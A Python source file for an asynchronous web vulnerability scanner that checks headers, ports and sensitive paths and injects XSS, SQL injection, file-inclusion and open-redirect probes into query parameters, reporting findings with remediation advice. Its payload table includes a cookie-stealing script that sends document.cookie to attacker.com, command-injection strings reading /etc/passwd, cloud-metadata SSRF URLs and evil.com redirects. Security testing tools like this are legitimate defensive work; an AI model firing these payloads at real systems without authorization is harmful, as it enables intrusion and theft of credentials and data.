import asyncio
import aiohttp
import logging
import os
import json
import re
from typing import List, Dict, Any
from bs4 import BeautifulSoup
import random
import string
import urllib.parse

logger = logging.getLogger(__name__)

class VulnerabilityScanner:
    def __init__(self):
        self.payloads_dir = "payloads"
        self.payloads = self._load_payloads()
    
    def _load_payloads(self) -> Dict[str, List[str]]:
        """Load payloads from files or use default ones if files don't exist."""
        payloads = {
            "xss": [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "javascript:alert('XSS')",
                "\"><script>alert('XSS')</script>",
                "'><script>alert('XSS')</script>",
                "<script>fetch('https://attacker.com/'+document.cookie)</script>"
            ],
            "sqli": [
                "' OR '1'='1",
                "' OR '1'='1' --",
                "' OR 1=1 --",
                "admin' --",
                "admin' #",
                "' UNION SELECT 1,2,3 --",
                "' UNION SELECT username,password,3 FROM users --"
            ],
            "lfi": [
                "../../../etc/passwd",
                "../../../../etc/passwd",
                "../../../etc/passwd%00",
                "../../../../../../etc/passwd",
                "/etc/passwd",
                "C:\\Windows\\system.ini",
                "file:///etc/passwd"
            ],
            "rce": [
                "; ls -la",
                "& dir",
                "| cat /etc/passwd",
                "; cat /etc/passwd",
                "$(cat /etc/passwd)",
                "`cat /etc/passwd`",
                "|| cat /etc/passwd"
            ],
            "ssrf": [
                "http://localhost",
                "http://127.0.0.1",
                "http://127.0.0.1:22",
                "http://169.254.169.254/latest/meta-data/",
                "http://metadata.google.internal/",
                "file:///etc/passwd",
                "dict://localhost:22"
            ],
            "open_redirect": [
                "//evil.com",
                "https://evil.com",
                "javascript:alert(document.domain)",
                "data:text/html,<script>window.open('https://evil.com')</script>",
                "/\\evil.com",
                "//google.com@evil.com"
            ]
        }
        
        # Try to load payloads from PayloadsAllTheThings if available
        try:
            if os.path.exists("PayloadsAllTheThings"):
                # XSS payloads
                xss_file = "PayloadsAllTheThings/XSS Injection/README.md"
                if os.path.exists(xss_file):
                    with open(xss_file, 'r', encoding='utf-8') as f:
                        content = f.read()
                        xss_payloads = re.findall(r'```(?:html|javascript)?\s*(.*?)\s*```', content, re.DOTALL)
                        if xss_payloads:
                            payloads["xss"] = [p.strip() for p in xss_payloads if p.strip()][:20]  # Limit to 20
                
                # SQL Injection payloads
                sqli_file = "PayloadsAllTheThings/SQL Injection/README.md"
                if os.path.exists(sqli_file):
                    with open(sqli_file, 'r', encoding='utf-8') as f:
                        content = f.read()
                        sqli_payloads = re.findall(r'```sql\s*(.*?)\s*```', content, re.DOTALL)
                        if sqli_payloads:
                            payloads["sqli"] = [p.strip() for p in sqli_payloads if p.strip()][:20]  # Limit to 20
                
                # LFI payloads
                lfi_file = "PayloadsAllTheThings/Directory Traversal/README.md"
                if os.path.exists(lfi_file):
                    with open(lfi_file, 'r', encoding='utf-8') as f:
                        content = f.read()
                        lfi_payloads = re.findall(r'```(?:php|)?\s*((?:\.\.\/|\/etc\/passwd|file:\/\/\/).*?)\s*```', content, re.DOTALL)
                        if lfi_payloads:
                            payloads["lfi"] = [p.strip() for p in lfi_payloads if p.strip()][:20]  # Limit to 20
        except Exception as e:
            logger.warning(f"Error loading payloads from PayloadsAllTheThings: {str(e)}")
        
        return payloads
    
    async def scan(self, target: str, paths: List[Dict[str, Any]], scan_depth: int = 2, timeout: int = 30) -> List[Dict[str, Any]]:
        """Scan a target for vulnerabilities."""
        if not target.startswith(('http://', 'https://')):
            target = f"https://{target}"
        
        vulnerabilities = []
        
        # Scan for server information
        server_info = await self._scan_server_info(target)
        if server_info:
            vulnerabilities.append(server_info)
        
        # Scan for security headers
        security_headers = await self._scan_security_headers(target)
        if security_headers:
            vulnerabilities.append(security_headers)
        
        # Scan for open ports
        open_ports = await self._scan_open_ports(target)
        if open_ports:
            vulnerabilities.append(open_ports)
        
        # Scan paths for vulnerabilities
        path_tasks = []
        for path_info in paths:
            path = path_info["path"]
            url = f"{target.rstrip('/')}{path}"
            
            # Skip paths that are already checked or have status code set to None
            if path_info.get("status_code") is None:
                continue
            
            # Only scan GET endpoints for now
            path_tasks.append(self._scan_path(target, path, scan_depth, timeout))
        
        path_results = await asyncio.gather(*path_tasks)
        for result in path_results:
            if result:
                vulnerabilities.extend(result)
        
        return vulnerabilities
    
    async def _scan_server_info(self, target: str) -> Dict[str, Any]:
        """Scan for server information disclosure."""
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(
                    target, 
                    headers={"User-Agent": "Mozilla/5.0"},
                    timeout=10
                ) as response:
                    headers = dict(response.headers)
                    server_info = {}
                    
                    # Check for server header
                    if "Server" in headers:
                        server_info["server"] = headers["Server"]
                    
                    # Check for X-Powered-By header
                    if "X-Powered-By" in headers:
                        server_info["x_powered_by"] = headers["X-Powered-By"]
                    
                    # Check for other technology headers
                    for header, value in headers.items():
                        if header.lower() in ["x-aspnet-version", "x-aspnetmvc-version", "x-generator"]:
                            server_info[header.lower()] = value
                    
                    if server_info:
                        return {
                            "type": "information_disclosure",
                            "name": "Server Information Disclosure",
                            "description": "The server is disclosing version information through HTTP headers",
                            "severity": "medium",
                            "url": target,
                            "evidence": server_info,
                            "remediation": "Configure the server to remove or obfuscate version information from HTTP headers"
                        }
        except Exception as e:
            logger.warning(f"Error scanning server info for {target}: {str(e)}")
        
        return None
    
    async def _scan_security_headers(self, target: str) -> Dict[str, Any]:
        """Scan for missing security headers."""
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(
                    target, 
                    headers={"User-Agent": "Mozilla/5.0"},
                    timeout=10
                ) as response:
                    headers = dict(response.headers)
                    missing_headers = []
                    
                    # Check for important security headers
                    security_headers = {
                        "Strict-Transport-Security": "Helps protect against protocol downgrade attacks and cookie hijacking",
                        "Content-Security-Policy": "Helps prevent XSS attacks by specifying which dynamic resources are allowed to load",
                        "X-Content-Type-Options": "Prevents MIME type sniffing",
                        "X-Frame-Options": "Protects against clickjacking attacks",
                        "X-XSS-Protection": "Enables the cross-site scripting filter in browsers",
                        "Referrer-Policy": "Controls how much referrer information should be included with requests"
                    }
                    
                    for header, description in security_headers.items():
                        if header not in headers:
                            missing_headers.append({
                                "header": header,
                                "description": description
                            })
                    
                    if missing_headers:
                        return {
                            "type": "missing_security_headers",
                            "name": "Missing Security Headers",
                            "description": f"The server is missing {len(missing_headers)} important security headers",
                            "severity": "medium",
                            "url": target,
                            "evidence": missing_headers,
                            "remediation": "Configure the server to include the missing security headers"
                        }
        except Exception as e:
            logger.warning(f"Error scanning security headers for {target}: {str(e)}")
        
        return None
    
    async def _scan_open_ports(self, target: str) -> Dict[str, Any]:
        """Scan for open ports (simplified version)."""
        # In a real implementation, you would use a proper port scanner
        # This is just a placeholder that returns a mock result
        domain = target.replace("https://", "").replace("http://", "").split("/")[0]
        
        try:
            import socket
            
            common_ports = [21, 22, 25, 80, 443, 8080, 8443]
            open_ports = []
            
            for port in common_ports:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    result = sock.connect_ex((domain, port))
                    if result == 0:
                        service = self._get_service_name(port)
                        open_ports.append({
                            "port": port,
                            "service": service
                        })
                    sock.close()
                except Exception:
                    pass
            
            if open_ports:
                return {
                    "type": "open_ports",
                    "name": "Open Ports",
                    "description": f"The server has {len(open_ports)} open ports",
                    "severity": "info",
                    "url": target,
                    "evidence": open_ports,
                    "remediation": "Close unnecessary ports or restrict access with a firewall"
                }
        except Exception as e:
            logger.warning(f"Error scanning open ports for {target}: {str(e)}")
        
        return None
    
    def _get_service_name(self, port: int) -> str:
        """Get service name for a port."""
        services = {
            21: "FTP",
            22: "SSH",
            25: "SMTP",
            80: "HTTP",
            443: "HTTPS",
            8080: "HTTP-Proxy",
            8443: "HTTPS-Alt"
        }
        return services.get(port, "Unknown")
    
    async def _scan_path(self, target: str, path: str, scan_depth: int, timeout: int) -> List[Dict[str, Any]]:
        """Scan a specific path for vulnerabilities."""
        vulnerabilities = []
        url = f"{target.rstrip('/')}{path}"
        
        # Skip certain file extensions and paths
        skip_extensions = ['.jpg', '.jpeg', '.png', '.gif', '.css', '.js', '.ico', '.svg']
        if any(path.endswith(ext) for ext in skip_extensions):
            return vulnerabilities
        
        # Basic scan - just check if the path exists
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(
                    url, 
                    headers={"User-Agent": "Mozilla/5.0"},
                    timeout=timeout,
                    allow_redirects=True
                ) as response:
                    status = response.status
                    
                    # Check for sensitive files
                    if path in ["/.git/config", "/.env", "/wp-config.php", "/config.php", "/database.yml"]:
                        if status == 200:
                            vulnerabilities.append({
                                "type": "sensitive_file",
                                "name": "Sensitive File Exposure",
                                "description": f"Sensitive file {path} is accessible",
                                "severity": "high",
                                "url": url,
                                "evidence": {"status_code": status},
                                "remediation": "Restrict access to sensitive files"
                            })
                    
                    # Check for directory listing
                    if status == 200:
                        html = await response.text()
                        if "Index of /" in html and "<table>" in html:
                            vulnerabilities.append({
                                "type": "directory_listing",
                                "name": "Directory Listing Enabled",
                                "description": "Directory listing is enabled, which can expose sensitive files",
                                "severity": "medium",
                                "url": url,
                                "evidence": {"status_code": status},
                                "remediation": "Disable directory listing in the web server configuration"
                            })
        except Exception as e:
            logger.warning(f"Error scanning path {url}: {str(e)}")
        
        # Advanced scan - only if scan_depth > 1
        if scan_depth > 1:
            # Check for XSS vulnerabilities
            xss_vulns = await self._check_xss(url, timeout)
            vulnerabilities.extend(xss_vulns)
            
            # Check for SQL injection vulnerabilities
            sqli_vulns = await self._check_sqli(url, timeout)
            vulnerabilities.extend(sqli_vulns)
            
            # Check for LFI vulnerabilities
            lfi_vulns = await self._check_lfi(url, timeout)
            vulnerabilities.extend(lfi_vulns)
            
            # Check for open redirect vulnerabilities
            redirect_vulns = await self._check_open_redirect(url, timeout)
            vulnerabilities.extend(redirect_vulns)
        
        return vulnerabilities
    
    async def _check_xss(self, url: str, timeout: int) -> List[Dict[str, Any]]:
        """Check for XSS vulnerabilities."""
        vulnerabilities = []
        
        # Parse URL to get parameters
        parsed_url = urllib.parse.urlparse(url)
        query_params = urllib.parse.parse_qs(parsed_url.query)
        
        if not query_params:
            return vulnerabilities
        
        for param, values in query_params.items():
            for payload in self.payloads["xss"][:3]:  # Use only first 3 payloads to limit requests
                try:
                    # Create a new query string with the payload
                    new_params = query_params.copy()
                    new_params[param] = [payload]
                    new_query = urllib.parse.urlencode(new_params, doseq=True)
                    
                    # Create the new URL
                    new_url = urllib.parse.urlunparse((
                        parsed_url.scheme,
                        parsed_url.netloc,
                        parsed_url.path,
                        parsed_url.params,
                        new_query,
                        parsed_url.fragment
                    ))
                    
                    async with aiohttp.ClientSession() as session:
                        async with session.get(
                            new_url, 
                            headers={"User-Agent": "Mozilla/5.0"},
                            timeout=timeout
                        ) as response:
                            if response.status == 200:
                                html = await response.text()
                                
                                # Check if the payload is reflected in the response
                                if payload in html:
                                    vulnerabilities.append({
                                        "type": "xss",
                                        "name": "Cross-Site Scripting (XSS)",
                                        "description": f"Parameter {param} is vulnerable to XSS",
                                        "severity": "high",
                                        "url": new_url,
                                        "evidence": {
                                            "payload": payload,
                                            "param": param
                                        },
                                        "remediation": "Implement proper input validation and output encoding"
                                    })
                                    break  # Found a vulnerability, no need to try more payloads
                except Exception as e:
                    logger.warning(f"Error checking XSS for {url} with param {param}: {str(e)}")
        
        return vulnerabilities
    
    async def _check_sqli(self, url: str, timeout: int) -> List[Dict[str, Any]]:
        """Check for SQL injection vulnerabilities."""
        vulnerabilities = []
        
        # Parse URL to get parameters
        parsed_url = urllib.parse.urlparse(url)
        query_params = urllib.parse.parse_qs(parsed_url.query)
        
        if not query_params:
            return vulnerabilities
        
        for param, values in query_params.items():
            for payload in self.payloads["sqli"][:3]:  # Use only first 3 payloads to limit requests
                try:
                    # Create a new query string with the payload
                    new_params = query_params.copy()
                    new_params[param] = [payload]
                    new_query = urllib.parse.urlencode(new_params, doseq=True)
                    
                    # Create the new URL
                    new_url = urllib.parse.urlunparse((
                        parsed_url.scheme,
                        parsed_url.netloc,
                        parsed_url.path,
                        parsed_url.params,
                        new_query,
                        parsed_url.fragment
                    ))
                    
                    async with aiohttp.ClientSession() as session:
                        async with session.get(
                            new_url, 
                            headers={"User-Agent": "Mozilla/5.0"},
                            timeout=timeout
                        ) as response:
                            if response.status == 200:
                                html = await response.text()
                                
                                # Check for SQL error messages
                                sql_errors = [
                                    "SQL syntax",
                                    "mysql_fetch_array",
                                    "ORA-",
                                    "Oracle error",
                                    "Microsoft SQL Server",
                                    "PostgreSQL",
                                    "SQLite3",
                                    "Division by zero",
                                    "supplied argument is not a valid MySQL",
                                    "mysql_numrows()",
                                    "mysql_fetch_assoc()",
                                    "pg_exec()",
                                    "Unclosed quotation mark",
                                    "ODBC SQL Server Driver"
                                ]
                                
                                for error in sql_errors:
                                    if error in html:
                                        vulnerabilities.append({
                                            "type": "sqli",
                                            "name": "SQL Injection",
                                            "description": f"Parameter {param} is vulnerable to SQL injection",
                                            "severity": "critical",
                                            "url": new_url,
                                            "evidence": {
                                                "payload": payload,
                                                "param": param,
                                                "error": error
                                            },
                                            "remediation": "Use parameterized queries or prepared statements"
                                        })
                                        break  # Found a vulnerability, no need to check more errors
                except Exception as e:
                    logger.warning(f"Error checking SQLi for {url} with param {param}: {str(e)}")
        
        return vulnerabilities
    
    async def _check_lfi(self, url: str, timeout: int) -> List[Dict[str, Any]]:
        """Check for Local File Inclusion vulnerabilities."""
        vulnerabilities = []
        
        # Parse URL to get parameters
        parsed_url = urllib.parse.urlparse(url)
        query_params = urllib.parse.parse_qs(parsed_url.query)
        
        if not query_params:
            return vulnerabilities
        
        for param, values in query_params.items():
            for payload in self.payloads["lfi"][:3]:  # Use only first 3 payloads to limit requests
                try:
                    # Create a new query string with the payload
                    new_params = query_params.copy()
                    new_params[param] = [payload]
                    new_query = urllib.parse.urlencode(new_params, doseq=True)
                    
                    # Create the new URL
                    new_url = urllib.parse.urlunparse((
                        parsed_url.scheme,
                        parsed_url.netloc,
                        parsed_url.path,
                        parsed_url.params,
                        new_query,
                        parsed_url.fragment
                    ))
                    
                    async with aiohttp.ClientSession() as session:
                        async with session.get(
                            new_url, 
                            headers={"User-Agent": "Mozilla/5.0"},
                            timeout=timeout
                        ) as response:
                            if response.status == 200:
                                html = await response.text()
                                
                                # Check for signs of successful LFI
                                lfi_indicators = [
                                    "root:x:",
                                    "[boot loader]",
                                    "uid=",
                                    "gid=",
                                    "/bin/bash",
                                    "daemon:",
                                    "nobody:",
                                    "sbin",
                                    "Build=",
                                    "windows\\system32"
                                ]
                                
                                for indicator in lfi_indicators:
                                    if indicator in html:
                                        vulnerabilities.append({
                                            "type": "lfi",
                                            "name": "Local File Inclusion",
                                            "description": f"Parameter {param} is vulnerable to LFI",
                                            "severity": "critical",
                                            "url": new_url,
                                            "evidence": {
                                                "payload": payload,
                                                "param": param,
                                                "indicator": indicator
                                            },
                                            "remediation": "Implement proper input validation and avoid using user input in file operations"
                                        })
                                        break  # Found a vulnerability, no need to check more indicators
                except Exception as e:
                    logger.warning(f"Error checking LFI for {url} with param {param}: {str(e)}")
        
        return vulnerabilities
    
    async def _check_open_redirect(self, url: str, timeout: int) -> List[Dict[str, Any]]:
        """Check for Open Redirect vulnerabilities."""
        vulnerabilities = []
        
        # Parse URL to get parameters
        parsed_url = urllib.parse.urlparse(url)
        query_params = urllib.parse.parse_qs(parsed_url.query)
        
        if not query_params:
            return vulnerabilities
        
        redirect_params = ["redirect", "url", "next", "return", "returnUrl", "returnTo", "goto", "continue", "dest", "destination"]
        
        for param, values in query_params.items():
            if param.lower() in redirect_params or "redirect" in param.lower() or "url" in param.lower():
                for payload in self.payloads["open_redirect"][:3]:  # Use only first 3 payloads to limit requests
                    try:
                        # Create a new query string with the payload
                        new_params = query_params.copy()
                        new_params[param] = [payload]
                        new_query = urllib.parse.urlencode(new_params, doseq=True)
                        
                        # Create the new URL
                        new_url = urllib.parse.urlunparse((
                            parsed_url.scheme,
                            parsed_url.netloc,
                            parsed_url.path,
                            parsed_url.params,
                            new_query,
                            parsed_url.fragment
                        ))
                        
                        async with aiohttp.ClientSession() as session:
                            async with session.get(
                                new_url, 
                                headers={"User-Agent": "Mozilla/5.0"},
                                timeout=timeout,
                                allow_redirects=False
                            ) as response:
                                # Check if the response is a redirect to the payload
                                if response.status in [301, 302, 303, 307, 308]:
                                    location = response.headers.get("Location", "")
                                    if payload in location:
                                        vulnerabilities.append({
                                            "type": "open_redirect",
                                            "name": "Open Redirect",
                                            "description": f"Parameter {param} is vulnerable to open redirect",
                                            "severity": "medium",
                                            "url": new_url,
                                            "evidence": {
                                                "payload": payload,
                                                "param": param,
                                                "location": location
                                            },
                                            "remediation": "Implement a whitelist of allowed redirect URLs or use relative URLs"
                                        })
                                        break  # Found a vulnerability, no need to try more payloads
                    except Exception as e:
                        logger.warning(f"Error checking open redirect for {url} with param {param}: {str(e)}")
        
        return vulnerabilities